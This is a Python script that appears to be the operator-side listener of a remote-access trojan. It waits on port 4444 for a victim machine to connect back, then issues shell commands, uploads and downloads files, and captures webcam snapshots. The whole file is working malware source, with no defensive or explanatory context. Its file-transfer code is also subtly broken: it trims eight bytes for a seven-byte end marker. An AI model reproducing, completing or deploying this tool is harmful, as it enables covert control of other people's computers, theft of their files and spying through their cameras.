import socket
import os
import re

def sanitize_filename(filepath):
    filename = os.path.basename(filepath)
    safe_filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
    return safe_filename

def clean_path(path):
    return os.path.normpath(path.strip().strip('"').strip("'"))

def main():
    server = socket.socket()
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    print("[+] Waiting for incoming connection...")
    client, addr = server.accept()
    print(f"[+] Connected from {addr}")

    while True:
        command = input("Shell >> ").strip()
        if not command:
            continue
        if command.lower() == "exit":
            client.send(b"exit")
            break

        
        elif command.startswith("putfile "):
            try:
                parts = command.split(" ", 2)
                if len(parts) != 3:
                    print("[!] Usage: putfile <server_file_path> <client_file_path>")
                    continue

                local_path = clean_path(parts[1])
                remote_path = clean_path(parts[2])

                if not os.path.exists(local_path):
                    print("[!] File does not exist on server")
                    continue

                client.send(f"putfile {remote_path}".encode())
                ack = client.recv(1024)

                with open(local_path, "rb") as f:
                    while True:
                        data = f.read(1024)
                        if not data:
                            break
                        client.send(data)
                client.send(b"<<END>>")

                result = client.recv(1024).decode(errors="ignore")
                print(result)

            except Exception as e:
                print(f"[!] Upload failed: {str(e)}")

        
        elif command.startswith("getfile "):
            filepath = clean_path(command.split(" ", 1)[1])
            client.send(f'getfile {filepath}'.encode())

            filename = sanitize_filename(filepath)
            with open(f"received_{filename}", "wb") as f:
                while True:
                    data = client.recv(1024)
                    if data.endswith(b"<<END>>"):
                        f.write(data[:-8])
                        break
                    f.write(data)
            print(f"[+] File saved as received_{filename}")

        
        elif command == "cam snap":
            client.send(command.encode())
            filename = "snapshot.jpg"
            with open(filename, "wb") as f:
                while True:
                    data = client.recv(1024)
                    if data.endswith(b"<<END>>"):
                        f.write(data[:-8])
                        break
                    f.write(data)
            print(f"[+] Snapshot saved as {filename}")

        
        else:
            client.send(command.encode())
            result = client.recv(4096).decode(errors="ignore")
            print(result)

    client.close()
    server.close()

if __name__ == "__main__":
    main()
